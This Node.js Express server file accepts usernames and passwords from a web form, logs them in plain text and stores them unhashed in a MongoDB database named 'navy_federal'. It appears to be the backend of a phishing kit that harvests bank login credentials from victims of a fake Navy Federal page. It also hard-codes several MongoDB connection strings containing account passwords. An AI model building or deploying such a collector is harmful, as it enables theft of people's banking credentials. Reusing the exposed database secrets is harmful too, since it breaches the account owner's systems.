// const express = require('express');
// const { MongoClient } = require('mongodb');
// const app = express();
// const port = 3000;

// // MongoDB connection string
// // const uri = process.env.MONGODB_CONNECT || "mongodb+srv://tylercrosson23:June23Csml.@navy-pjcjbaz.mongodb.net/"

// const uri = "mongodb+srv://phindCode:phindCode@cluster0.kcfnncd.mongodb.net/navy_federal"
// console.log(uri)

// let client;

// // Function to connect to MongoDB
// async function connectDB() {
//   if (client) return client;
//   client = await MongoClient.connect(uri, {
//     useNewUrlParser: true,
//     useUnifiedTopology: true,
//   });
//   return client;
// }
// const cors = require('cors');
// app.use(cors());


// // Middleware to parse JSON bodies
// app.use(express.json());

// // POST endpoint to handle form submissions
// app.post('/submit-form', async (req, res) => {
//   await connectDB();
//   const db = client.db('navy_federal'); // Replace 'mydatabase' with your actual database name
//   const usersCollection = db.collection('users');

//   // Extract form data from req.body
//     const { username, password } = req.body;
//     console.log(username, password)

//   // Insert the form data into MongoDB
//     const result = await usersCollection.insertOne({ username, password });
//     console.log(result)

//   res.status(200).send('Form data submitted successfully');
// });

// // Start the server
// app.listen(port, () => {
//   console.log(`Server running at http://localhost:${port}`);
// });


const express = require('express');
const { MongoClient } = require('mongodb');
const cors = require('cors');
const app = express();
const port = 3000;

// MongoDB connection string
// const uri = "mongodb+srv://phindCode:phindCode@cluster0.kcfnncd.mongodb.net/navy_federal"
// const uri = process.env.MONGODB_CONNECT || "mongodb+srv://tylercrosson23:June23Csml.@navy-pjcjbaz.mongodb.net/navy_federal"
 const uri = "mongodb+srv://tylercrosson23:June23Csm1.@navy.pjcjbaz.mongodb.net/"
console.log(`MongoDB Connection URI: ${uri}`);

let client;

// Function to connect to MongoDB
async function connectDB() {
  if (client) return client;
  try {
    client = await MongoClient.connect(uri, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('Connected to MongoDB');
  } catch (error) {
    console.error('Failed to connect to MongoDB:', error);
    throw error; // Propagate error
  }
  return client;
}

app.use(cors());
app.use(express.json());

// POST endpoint to handle form submissions
app.post('/submit-form', async (req, res) => {
  try {
    await connectDB();
    const db = client.db('navy_federal');
    const usersCollection = db.collection('users');

    const { username, password } = req.body;
    console.log('Received:', username, password);

    const result = await usersCollection.insertOne({ username, password });
    console.log('Insert Result:', result);

    res.status(200).send('Form data submitted successfully');
  } catch (error) {
    console.error('Error handling form submission:', error);
    res.status(500).send('An error occurred while submitting the form');
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});